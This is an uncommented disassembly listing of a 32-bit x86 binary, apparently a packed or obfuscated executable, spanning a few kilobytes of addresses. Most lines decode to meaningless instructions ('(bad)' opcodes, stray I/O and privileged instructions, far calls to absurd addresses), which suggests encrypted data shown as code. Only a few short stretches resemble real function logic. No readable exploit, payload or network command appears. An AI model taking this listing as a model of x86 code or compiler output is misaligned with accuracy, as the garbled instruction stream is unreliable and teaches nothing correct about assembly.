  40dafe:	dec    edi
  40daff:	mov    eax,0x6008cf8e
  40db04:	nop
  40db05:	fucom  st(0)
  40db07:	jle    0x40db59
  40db09:	retf   
  40db0a:	mov    bh,0x1b
  40db0c:	push   ecx
  40db0d:	sbb    edx,edx
  40db0f:	xor    al,0x8f
  40db11:	hlt    
  40db12:	xchg   ebx,eax
  40db13:	push   edi
  40db14:	jg     0x40db77
  40db16:	retf   0xbcef
  40db19:	mov    ah,0x6d
  40db1b:	fbstp  TBYTE PTR [ebx+0x14f6d7a3]
  40db21:	imul   ebx,DWORD PTR [edx+0x56],0xd97ff20b
  40db28:	sub    ecx,DWORD PTR [ebp+0x1e]
  40db2b:	fisttp QWORD PTR [esi]
  40db2d:	imul   edx,DWORD PTR [ebp-0x31],0x7
  40db31:	jmp    0x4d07069
  40db36:	ror    BYTE PTR [ebp-0x58918be6],0x1c
  40db3d:	add    ebx,DWORD PTR [edx-0x39]
  40db40:	shr    DWORD PTR [edi+0x2b],0x42
  40db44:	inc    ebp
  40db45:	and    al,ch
  40db47:	push   esp
  40db48:	and    DWORD PTR [edx+0x3d1f6c10],eax
  40db4e:	xchg   ebp,eax
  40db4f:	mov    ch,0x9c
  40db51:	retf   
  40db52:	aad    0xbb
  40db54:	stos   DWORD PTR es:[edi],eax
  40db55:	pop    ss
  40db56:	dec    esp
  40db57:	shr    BYTE PTR [edx+0x34ba8f1e],0xd7
  40db5e:	jo     0x40db16
  40db60:	sub    eax,0x1c83379e
  40db65:	inc    ebx
  40db66:	(bad)  
  40db67:	fdiv   st,st(1)
  40db69:	jmp    FWORD PTR [ebx-0x1a9896da]
  40db6f:	loopne 0x40db4d
  40db71:	repz inc esi
  40db73:	lahf   
  40db74:	popf   
  40db75:	retf   
  40db76:	mov    al,ds:0xe46ebf5d
  40db7b:	jo     0x40db5c
  40db7d:	test   al,0xe1
  40db7f:	sub    DWORD PTR [edx+0x13],edi
  40db82:	xor    BYTE PTR [ecx+ebp*1+0x45],dh
  40db86:	repnz cdq 
  40db88:	cmp    al,0xad
  40db8b:	not    DWORD PTR [ecx+0x6f52ab08]
  40db91:	ja     0x40db86
  40db93:	or     al,0x1d
  40db95:	iret   
  40db96:	xlat   BYTE PTR ds:[ebx]
  40db97:	stos   BYTE PTR es:[edi],al
  40db98:	xor    al,BYTE PTR [edx+esi*2+0x67]
  40db9c:	or     al,BYTE PTR [edx]
  40db9e:	pop    es
  40db9f:	sub    BYTE PTR [edx+0x6f],ah
  40dba2:	gs pop esi
  40dba4:	mov    bh,BYTE PTR [ecx]
  40dba6:	xchg   ecx,eax
  40dba7:	xlat   BYTE PTR ds:[ebx]
  40dba8:	mov    cl,0xd
  40dbaa:	and    al,0x31
  40dbac:	(bad)  
  40dbad:	fbstp  TBYTE PTR [eax+ebx*4+0x558fc351]
  40dbb4:	dec    esp
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0xbbfeba4],0xfa947319
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbb4
  40dbe0:	ret    0x4250
  40dbe3:	dec    esp
  40dbe4:	mov    ch,0xbd
  40dbe6:	loopne 0x40dbad
  40dbe8:	call   0x5f5c:0xcdc31b6e
  40dbef:	shr    BYTE PTR [esp+edi*4-0x32],0xe4
  40dbf4:	xchg   ecx,eax
  40dbf5:	out    dx,eax
  40dbf6:	mov    eax,DWORD PTR [ebx]
  40dbf8:	ja     0x40dc6a
  40dbfa:	scas   al,BYTE PTR es:[edi]
  40dbfb:	ss lahf 
  40dbfd:	into   
  40dbfe:	pop    ds
  40dbff:	(bad)
  40dc03:	das    
  40dc04:	out    dx,al
  40dc05:	cwde   
  40dc06:	fdiv   st(1),st
  40dc08:	outs   dx,BYTE PTR ds:[esi]
  40dc09:	sub    DWORD PTR [edx+0x62e01248],ebp
  40dc0f:	call   0xeb796a36
  40dc14:	pop    es
  40dc15:	das    
  40dc16:	iret   
  40dc17:	ds cs cli 
  40dc1a:	jno    0x40dbcd
  40dc1c:	daa    
  40dc1d:	sub    al,0x96
  40dc1f:	mov    ds,ecx
  40dc21:	inc    ebp
  40dc22:	loope  0x40dc41
  40dc24:	xor    DWORD PTR ds:0xf7ddbb97,edx
  40dc2a:	sbb    eax,0x26132905
  40dc2f:	jae    0x40dc58
  40dc31:	mov    dh,0xb7
  40dc33:	cmp    esi,edi
  40dc35:	jb     0x40dbf6
  40dc37:	popf   
  40dc38:	ds std 
  40dc3a:	je     0x40dcbb
  40dc3c:	loop   0x40dc67
  40dc3e:	jo     0x40dc95
  40dc40:	fstp   TBYTE PTR [esi+0x738c3dd6]
  40dc46:	dec    ecx
  40dc47:	retf   
  40dc48:	xlat   BYTE PTR ds:[ebx]
  40dc49:	pop    edx
  40dc4a:	jae    0x40dc7d
  40dc4c:	addr16 push eax
  40dc4e:	std    
  40dc4f:	cmp    DWORD PTR [ecx],ecx
  40dc51:	xchg   ebx,eax
  40dc52:	or     cl,BYTE PTR [edi-0x63560a6]
  40dc58:	int    0xf4
  40dc5a:	pop    esp
  40dc5b:	xor    bl,BYTE PTR [ecx]
  40dc5d:	pusha  
  40dc5e:	or     DWORD PTR [ebp-0x501e1ec5],ebp
  40dc64:	out    0xe0,eax
  40dc66:	jge    0x40dcb5
  40dc68:	inc    edi
  40dc69:	push   ecx
  40dc6a:	xlat   BYTE PTR ds:[ebx]
  40dc6b:	fadd   st(3),st
  40dc6d:	sahf   
  40dc6e:	(bad)  
  40dc6f:	or     cl,BYTE PTR [ebp+eax*2+0x4fdf8fc4]
  40dc76:	add    BYTE PTR cs:[ebx+0x76],cl
  40dc7a:	fcomp  DWORD PTR [esi]
  40dc7c:	sub    DWORD PTR [eax-0x2b],ecx
  40dc7f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40dc81:	add    al,BYTE PTR [edx-0x2f]
  40dc84:	mov    eax,ds:0x769513c5
  40dc89:	imul   ebp,DWORD PTR [ebp+0x5c],0x4459da1f
  40dc90:	adc    DWORD PTR [edx-0x77],0xffffffc3
  40dc94:	out    dx,eax
  40dc95:	arpl   WORD PTR [esi],bx
  40dc97:	sub    bh,BYTE PTR [ecx-0x4c7c1276]
  40dc9d:	inc    eax
  40dc9e:	bnd jnp 0x40dc9f
  40dca1:	xor    cl,ah
  40dca3:	jo     0x40dc7a
  40dca5:	pop    ebx
  40dca6:	(bad)  
  40dca8:	scas   al,BYTE PTR es:[edi]
  40dca9:	(bad)  
  40dcaa:	lea    edi,[ecx+ecx*4-0x5f]
  40dcae:	sbb    al,0x80
  40dcb0:	call   0x377f:0xf7cb5dcd
  40dcb7:	and    bl,BYTE PTR [eax+0x43]
  40dcba:	jo     0x40dcd0
  40dcbc:	or     al,0x7
  40dcbe:	mov    ch,0xf8
  40dcc0:	es jecxz 0x40dca7
  40dcc3:	push   ebx
  40dcc4:	or     al,0xe4
  40dcc6:	inc    eax
  40dcc7:	adc    eax,0xe19c13b
  40dccc:	sbb    eax,0xd1373d82
  40dcd1:	enter  0xc4c0,0xe3
  40dcd5:	mov    dh,0x25
  40dcd7:	lods   al,BYTE PTR ds:[esi]
  40dcd8:	sbb    edx,DWORD PTR [ebx+0x29a48bc1]
  40dcde:	stos   BYTE PTR es:[edi],al
  40dcdf:	sub    DWORD PTR [bx+0x1c67],ebp
  40dce4:	and    eax,0xdbccca8e
  40dce9:	das    
  40dcea:	out    dx,eax
  40dceb:	xor    al,0xe5
  40dced:	jge    0x40dd23
  40dcef:	clc    
  40dcf0:	push   esi
  40dcf1:	int    0x99
  40dcf3:	and    BYTE PTR [esi],bl
  40dcf5:	fistp  DWORD PTR [ebp+0x3fc40c30]
  40dcfb:	add    ecx,edi
  40dcfd:	push   ecx
  40dcfe:	scas   eax,DWORD PTR es:[edi]
  40dcff:	mov    bl,0x85
  40dd01:	xor    al,0x5e
  40dd03:	mov    ds:0x147b3e96,eax
  40dd08:	xchg   DWORD PTR [edi-0x72446287],edi
  40dd0e:	mov    esi,0xdf30faa1
  40dd13:	cwde   
  40dd14:	add    al,0x65
  40dd16:	arpl   WORD PTR [edx+0x330f8077],sp
  40dd1c:	add    esi,DWORD PTR [esi+eax*8+0x4d]
  40dd20:	and    ebx,DWORD PTR [edx-0x881ec11]
  40dd26:	pop    edx
  40dd27:	pushf  
  40dd28:	add    eax,0x3805f867
  40dd2d:	shl    BYTE PTR fs:[ebx+ebp*1-0xa],cl
  40dd32:	mov    DWORD PTR [edi+0x24],esi
  40dd35:	test   DWORD PTR [edi+edx*1-0x263482db],esp
  40dd3c:	pop    ebp
  40dd3d:	sub    cl,ch
  40dd3f:	push   esi
  40dd40:	in     al,0x62
  40dd42:	or     eax,0x1f77301f
  40dd47:	test   BYTE PTR [edx-0x73133847],cl
  40dd4d:	cmp    al,0x8
  40dd4f:	pop    DWORD PTR [ebp-0x71]
  40dd52:	div    BYTE PTR [ebx+0x56]
  40dd55:	adc    al,0x5b
  40dd57:	aas    
  40dd58:	jnp    0x40dcfa
  40dd5a:	(bad)  
  40dd5b:	ins    BYTE PTR es:[edi],dx
  40dd5c:	fimul  WORD PTR [edi+0x34cf6543]
  40dd62:	mov    edi,0x5d3745de
  40dd67:	mov    ah,0x6b
  40dd69:	popf   
  40dd6a:	dec    esi
  40dd6b:	push   ecx
  40dd6c:	and    eax,0xe2ef1f95
  40dd71:	mov    edx,0xd4dddbfd
  40dd76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd77:	out    0x19,eax
  40dd79:	sti    
  40dd7a:	and    al,0x88
  40dd7c:	mov    cl,0x61
  40dd7e:	outs   dx,BYTE PTR ds:[esi]
  40dd7f:	cmp    DWORD PTR [ebp-0x66],0x8afed1cd
  40dd86:	sub    ebx,DWORD PTR ds:0xd4e7e46a
  40dd8c:	loope  0x40dd63
  40dd8e:	ror    DWORD PTR [ecx],0x38
  40dd91:	clc    
  40dd92:	scas   al,BYTE PTR es:[edi]
  40dd93:	pushf  
  40dd94:	cld    
  40dd95:	mov    bl,0xc5
  40dd97:	lods   eax,DWORD PTR ds:[esi]
  40dd98:	sahf   
  40dd99:	mov    ecx,0x705e22c3
  40dd9e:	xor    DWORD PTR [esi-0x12],edx
  40dda1:	test   ecx,ecx
  40dda3:	int    0xec
  40dda5:	fstp   st(1)
  40dda7:	dec    eax
  40dda8:	jle    0x40ddb3
  40ddaa:	arpl   WORD PTR [edi+0x60],dx
  40ddad:	icebp  
  40ddae:	mov    esp,0x9962874c
  40ddb3:	arpl   WORD PTR [ebx+0xe],ax
  40ddb6:	xchg   ecx,eax
  40ddb7:	sub    eax,0xf1c509cc
  40ddbc:	inc    edi
  40ddbd:	mov    cl,0xf7
  40ddbf:	add    al,0x74
  40ddc1:	mov    ds:0x6e44d181,al
  40ddc6:	mov    dh,0xa0
  40ddc8:	mov    eax,ds:0x490b8847
  40ddcd:	adc    BYTE PTR [ebx],cl
  40ddcf:	mov    ch,0x61
  40ddd1:	inc    esi
  40ddd2:	ja     0x40dd82
  40ddd4:	inc    ebp
  40ddd5:	test   al,0x60
  40ddd7:	sub    eax,0xccd24d7a
  40dddc:	lea    ecx,[ecx]
  40ddde:	or     DWORD PTR [edi],0xc3b23f23
  40dde4:	pop    ebx
  40dde5:	loope  0x40ddb5
  40dde7:	dec    esi
  40dde8:	pop    edx
  40dde9:	cmc    
  40ddea:	xchg   ecx,eax
  40ddeb:	pushf  
  40ddec:	xchg   esi,eax
  40dded:	icebp  
  40ddee:	mov    BYTE PTR [esi],ch
  40ddf0:	add    BYTE PTR [eax+0x9b725e9],0x2e
  40ddf7:	jle    0x40de36
  40ddf9:	shr    DWORD PTR ds:0xdd475494,0x29
  40de00:	mov    al,0x54
  40de02:	mov    ds:0x323f4aad,eax
  40de07:	shr    BYTE PTR [ecx-0x72151c36],0x8c
  40de0e:	or     eax,0xaedaf954
  40de13:	jne    0x40ddbf
  40de15:	imul   ebp,DWORD PTR [esi-0x30],0x76
  40de19:	jmp    0x40ddb2
  40de1b:	sbb    DWORD PTR [ecx-0x3a],eax
  40de1e:	push   0xb8a3c603
  40de23:	cmp    eax,DWORD PTR [ecx+0x0]
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	idiv   DWORD PTR [eax]
  40dea7:	mov    ds:0x9cbac00c,al
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40deb5
  40deb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40deb4:	mov    al,BYTE PTR [ebx-0x3cc9c21c]
  40deba:	add    eax,0x1e8c9843
  40debf:	cdq    
  40dec0:	outs   dx,BYTE PTR ss:[esi]
  40dec2:	ins    BYTE PTR es:[edi],dx
  40dec3:	mov    dl,0x92
  40dec5:	pop    eax
  40dec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec7:	push   eax
  40dec8:	push   edi
  40dec9:	icebp  
  40deca:	pop    ss
  40decb:	push   0xffffffea
  40decd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dece:	loopne 0x40df49
  40ded0:	mov    edx,0xca36a1a8
  40ded5:	ret    
  40ded6:	jno    0x40dee4
  40ded8:	cmp    al,0x4c
  40deda:	les    esi,FWORD PTR [edx]
  40dedc:	dec    esp
  40dedd:	inc    eax
  40dede:	mov    bl,0x7a
  40dee0:	pusha  
  40dee1:	sub    eax,0x28fe1daf
  40dee6:	imul   esi,ebp,0xdab9217f
  40deec:	inc    edi
  40deed:	repz iret 
  40deef:	mov    ds:0x973d5397,eax
  40def4:	pop    ebp
  40def5:	jb     0x40df56
  40def7:	cmp    eax,0x219ce772
  40defc:	lods   eax,DWORD PTR ds:[esi]
  40defd:	jg     0x40de9a
  40deff:	mov    cl,0x49
  40df01:	jae    0x40df49
  40df03:	mov    al,0xb2
  40df05:	out    dx,eax
  40df06:	cs stos BYTE PTR es:[edi],al
  40df08:	enter  0x8952,0xcb
  40df0c:	add    al,0xf2
  40df0e:	(bad)  
  40df0f:	loop   0x40ded5
  40df11:	mov    esp,0x1a91c8fb
  40df16:	sub    BYTE PTR [edx-0x7b292737],dl
  40df1c:	adc    dl,BYTE PTR [ecx-0x7a]
  40df1f:	fs aaa 
  40df21:	and    BYTE PTR [ebp-0x77],dl
  40df24:	jmp    0x40df30
  40df26:	pop    edx
  40df27:	add    eax,DWORD PTR [edi+0x5]
  40df2a:	pop    es
  40df2b:	xlat   BYTE PTR ds:[ebx]
  40df2c:	inc    edx
  40df2d:	aam    0xe1
  40df2f:	cmp    BYTE PTR [ebx+0x7d800db9],0xf6
  40df36:	xchg   BYTE PTR [ebx-0x51a9b8bc],bh
  40df3c:	fsub   DWORD PTR [ecx]
  40df3e:	push   edx
  40df3f:	repnz push ss
  40df41:	xchg   esp,eax
  40df42:	in     eax,0x28
  40df44:	pusha  
  40df45:	mov    cl,cl
  40df47:	sahf   
  40df48:	pop    es
  40df49:	popf   
  40df4a:	push   cs
  40df4b:	xchg   ebp,eax
  40df4c:	push   ebx
  40df4d:	sbb    eax,0xae515d0a
  40df52:	mov    esi,0xa25ce2a1
  40df57:	mov    bl,dh
  40df59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df5a:	inc    ebx
  40df5b:	sub    al,0x42
  40df5d:	mov    ?,eax
  40df5f:	call   0x4d9ae03f
  40df64:	and    eax,0xd096831e
  40df69:	mov    edx,0x45cad883
  40df6e:	add    dl,bl
  40df70:	daa    
  40df71:	xor    al,0x21
  40df73:	dec    edx
  40df74:	dec    esi
  40df75:	loop   0x40df07
  40df77:	adc    eax,eax
  40df79:	fcomp  st(5)
  40df7b:	push   ebx
  40df7c:	jne    0x40df7a
  40df7e:	dec    edi
  40df7f:	push   edx
  40df80:	push   esp
  40df81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df82:	or     DWORD PTR [eax+ecx*2],esp
  40df85:	js     0x40df4f
  40df87:	sub    edx,DWORD PTR [eax]
  40df89:	xor    BYTE PTR [ebx+0x28],0x9a
  40df8d:	sar    DWORD PTR [edi+0x515c487e],cl
  40df93:	pcmpeqd mm5,QWORD PTR [edi]
  40df96:	imul   ebx,esp,0x4486700f
  40df9c:	add    dh,ah
  40df9e:	or     bl,BYTE PTR [edx+0xb]
  40dfa1:	out    dx,al
  40dfa2:	mov    bl,0x4f
  40dfa4:	cdq    
  40dfa5:	and    al,0x93
  40dfa7:	mov    edi,0x5f66505a
  40dfac:	loop   0x40dfc5
  40dfae:	(bad)  [esi]
  40dfb0:	mov    esp,0x49e48f6f
  40dfb5:	pop    esp
  40dfb6:	inc    edx
  40dfb7:	pop    ebx
  40dfb8:	loope  0x40dfdd
  40dfba:	mov    ebp,0xe90c26b7
  40dfbf:	or     ebx,DWORD PTR [edx]
  40dfc1:	add    ebp,DWORD PTR [ebp+0x41612ccd]
  40dfc7:	retf   
  40dfc8:	cmp    al,0xf2
  40dfca:	dec    esp
  40dfcb:	push   edi
  40dfcc:	mov    ds:0x8458bc9,al
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	fiadd  DWORD PTR [ebx-0x66]
  40e006:	jg     0x40e066
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40dfc5
  40e010:	or     BYTE PTR [edx+0x70],cl
  40e013:	lock push edx
  40e015:	sbb    al,0x93
  40e017:	nop
  40e018:	shl    DWORD PTR [edx-0x351dd720],cl
  40e01e:	aaa    
  40e01f:	(bad)
  40e022:	lock or DWORD PTR [ebx-0x2d],ebp
  40e026:	(bad)  
  40e027:	mov    dh,0xe1
  40e029:	sbb    BYTE PTR [esi-0x6f],0x12
  40e02d:	mov    ch,0x97
  40e02f:	push   eax
  40e030:	jns    0x40dfd6
  40e032:	or     DWORD PTR [ebp-0x59426a8d],esp
  40e038:	mov    dh,0x74
  40e03a:	je     0x40dfeb
  40e03c:	(bad)  
  40e03e:	sbb    ah,BYTE PTR [eax+0x9]
  40e041:	out    0xde,al
  40e043:	pop    es
  40e044:	sbb    eax,DWORD PTR [ecx+0x35]
  40e047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e048:	and    DWORD PTR [ebx+0x4e1d166b],0xffffff83
  40e04f:	mov    bh,BYTE PTR [esi+0x0]
  40e052:	in     al,0xce
  40e054:	xchg   DWORD PTR [edx+0x16367b22],esp
  40e05a:	jb     0x40e082
  40e05c:	add    ah,BYTE PTR [ebx]
  40e05e:	out    0x3d,eax
  40e060:	(bad)
  40e065:	popa   
  40e066:	push   ecx
  40e067:	loop   0x40e093
  40e069:	pop    edi
  40e06a:	lods   al,BYTE PTR ds:[esi]
  40e06b:	push   edx
  40e06c:	cdq    
  40e06d:	or     DWORD PTR [ecx-0x3b39b2d7],0x8e789d0c
  40e077:	outs   dx,WORD PTR ds:[esi]
  40e079:	inc    ebx
  40e07a:	in     al,0xbc
  40e07c:	stos   DWORD PTR es:[edi],eax
  40e07d:	adc    BYTE PTR [ebx+0x20],dh
  40e080:	jbe    0x40e006
  40e082:	fnstsw WORD PTR [eax-0xeb3938]
  40e088:	jmp    0x40e01e
  40e08a:	aaa    
  40e08b:	jb     0x40e02a
  40e08d:	mov    bl,BYTE PTR gs:[ebp-0x6e]
  40e091:	cmp    eax,0x68367768
  40e096:	or     bl,dh
  40e098:	mov    bh,0x6c
  40e09a:	in     al,0x7c
  40e09c:	cmp    al,0xe5
  40e09e:	leave  
  40e09f:	jno    0x40e040
  40e0a1:	cdq    
  40e0a2:	xchg   esi,eax
  40e0a3:	xchg   ebp,eax
  40e0a4:	mov    esi,0x314074e3
  40e0a9:	sti    
  40e0aa:	in     eax,0x12
  40e0ac:	popf   
  40e0ad:	or     eax,0x1abd7674
  40e0b2:	mov    ds:0xd18f39f5,eax
  40e0b7:	push   ecx
  40e0b8:	cmp    DWORD PTR [ecx],esi
  40e0ba:	cdq    
  40e0bb:	fistp  DWORD PTR [eax]
  40e0bd:	in     eax,0xe3
  40e0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0c0:	imul   esp,DWORD PTR es:[ecx+0x6a],0x2f72198c
  40e0c8:	jge    0x40e072
  40e0ca:	xchg   BYTE PTR [edi+0x29],dh
  40e0cd:	jmp    0xa3832839
  40e0d2:	mov    cl,0x42
  40e0d4:	pop    ss
  40e0d5:	aaa    
  40e0d6:	and    eax,0xce43f905
  40e0db:	stos   BYTE PTR es:[edi],al
  40e0dc:	dec    edx
  40e0dd:	xor    bh,dh
  40e0df:	pusha  
  40e0e0:	(bad)  
  40e0e1:	push   ecx
  40e0e2:	imul   esi,DWORD PTR [esi-0x66],0xc258c309
  40e0e9:	xor    edx,DWORD PTR [edi+edi*2-0x54]
  40e0ed:	adc    BYTE PTR [ebx-0x35e28011],ah
  40e0f3:	add    eax,edx
  40e0f5:	(bad)  
  40e0f6:	test   DWORD PTR [eax],ebp
  40e0f8:	sub    edi,DWORD PTR [ebp-0x33]
  40e0fb:	mov    dh,0x65
  40e0fd:	mov    edi,0x975bec2d
  40e102:	bound  esi,QWORD PTR [ebp-0x36bea22]
  40e108:	xor    DWORD PTR [eax-0x25],esp
  40e10b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e10c:	lock jmp 0xd968:0x1928cfd6
  40e114:	retf   0xf177
  40e117:	std    
  40e118:	mov    ds:0xe445bfe5,al
  40e11d:	mov    esp,DWORD PTR [edi]
  40e11f:	dec    esp
  40e120:	inc    ebx
  40e121:	mov    ebx,0x99450b1f
  40e126:	add    BYTE PTR [eax],cl
  40e128:	je     0x40e147
  40e12a:	pop    ss
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4337a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	call   0x72c960fa
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	shr    DWORD PTR [ebp-0x50],1
  40e169:	mov    eax,?
  40e16b:	test   DWORD PTR [edi-0x2f],ecx
  40e16e:	ins    DWORD PTR es:[edi],dx
  40e16f:	mov    dl,0x45
  40e171:	(bad)  
  40e172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e173:	xchg   ebp,eax
  40e174:	push   0xffffffd6
  40e176:	push   ecx
  40e177:	std    
  40e178:	cmp    bh,BYTE PTR [esi+esi*8-0x59]
  40e17c:	sbb    esp,DWORD PTR [ebp-0x4525f250]
  40e182:	icebp  
  40e183:	out    dx,al
  40e184:	dec    eax
  40e185:	mov    eax,ds:0x8706d062
  40e18a:	test   BYTE PTR [eax-0x108d902],ch
  40e190:	push   ebx
  40e191:	imul   ecx,DWORD PTR [ebp+0x64],0x1e
  40e195:	dec    esi
  40e196:	sbb    eax,0x3aacc6e4
  40e19b:	pop    ss
  40e19c:	cmp    DWORD PTR [ebx-0x2b],ecx
  40e19f:	push   ebp
  40e1a0:	dec    edx
  40e1a1:	(bad)  
  40e1a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a3:	lock pop eax
  40e1a5:	hlt    
  40e1a6:	push   0x25
  40e1a8:	outs   dx,DWORD PTR ds:[esi]
  40e1a9:	stc    
  40e1aa:	aad    0x67
  40e1ac:	mov    dh,0x16
  40e1ae:	sbb    DWORD PTR [ecx-0x7d],0xffffff99
  40e1b2:	iret   
  40e1b3:	inc    edx
  40e1b4:	xchg   edi,eax
  40e1b5:	mov    eax,ds:0x4356b364
  40e1ba:	pop    ss
  40e1bb:	(bad)  
  40e1bc:	adc    ah,dl
  40e1be:	retf   0x5ea6
  40e1c1:	mov    edi,0xec28528d
  40e1c6:	jnp    0x40e1db
  40e1c8:	xchg   ebp,eax
  40e1c9:	pop    ebp
  40e1ca:	repnz sbb cl,BYTE PTR [edx+eax*8+0x24]
  40e1cf:	sahf   
  40e1d0:	lahf   
  40e1d1:	adc    eax,0xd35ec377
  40e1d6:	(bad)  
  40e1d7:	in     al,dx
  40e1d8:	leave  
  40e1d9:	jbe    0x40e242
  40e1db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1dc:	and    eax,0x99a91a77
  40e1e1:	mov    bl,0xe5
  40e1e3:	addr16 clc 
  40e1e5:	(bad)  
  40e1e6:	adc    BYTE PTR ss:[ebp-0x16],0xb8
  40e1eb:	xchg   esp,eax
  40e1ed:	retf   0xe677
  40e1f0:	lea    ebx,[ebx-0x39d2b7ac]
  40e1f6:	in     al,dx
  40e1f7:	xchg   esi,eax
  40e1f8:	push   ebx
  40e1f9:	push   ds
  40e1fa:	fidivr DWORD PTR [eax-0x3911f527]
  40e200:	sub    dl,ch
  40e202:	ss leave 
  40e204:	mov    esp,0x1330a9f9
  40e209:	cld    
  40e20a:	dec    esi
  40e20b:	shl    BYTE PTR [edi],1
  40e20d:	repz push ebx
  40e20f:	push   ecx
  40e210:	add    ecx,DWORD PTR [ecx-0x61d49df6]
  40e216:	mov    ebx,edi
  40e218:	sub    eax,0x729d4a95
  40e21d:	mov    WORD PTR [edi+ebx*1-0x2a],ds
  40e221:	not    BYTE PTR [edx-0x43c36cbe]
  40e227:	push   edx
  40e228:	nop
  40e229:	sahf   
  40e22a:	cdq    
  40e22b:	push   cs
  40e22c:	xor    ch,dh
  40e22e:	xor    al,0xa0
  40e230:	xchg   edx,eax
  40e231:	sar    DWORD PTR [ebx-0x28],1
  40e234:	jo     0x40e227
  40e236:	sub    eax,0x48423ec8
  40e23b:	adc    eax,0x25ad6c80
  40e240:	inc    ebx
  40e241:	rcr    BYTE PTR [ecx-0x28758222],0xae
  40e248:	mov    eax,0x2762bf49
  40e24d:	pop    ss
  40e24e:	adc    BYTE PTR [edx+esi*4-0x4cd2dcef],bh
  40e255:	add    esi,DWORD PTR [ecx+0x14]
  40e258:	aam    0x91
  40e25a:	cmp    DWORD PTR [esp+ebp*4-0x5b],0xfffffff4
  40e25f:	imul   esp,DWORD PTR [ecx+0x62],0xfbdcf7ba
  40e266:	sbb    al,0x90
  40e268:	daa    
  40e269:	into   
  40e26a:	retf   
  40e26b:	dec    ebp
  40e26c:	mov    edx,0xfae71a58
  40e271:	out    dx,eax
  40e272:	push   0xeaff23d6
  40e277:	std    
  40e278:	add    al,BYTE PTR [ebx+ebx*8]
  40e27b:	ret    
  40e27c:	mov    al,0xf
  40e27e:	add    bh,BYTE PTR [ecx]
  40e280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e281:	dec    BYTE PTR [ecx+0x7d8be845]
  40e287:	or     bh,bh
  40e289:	add    eax,0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
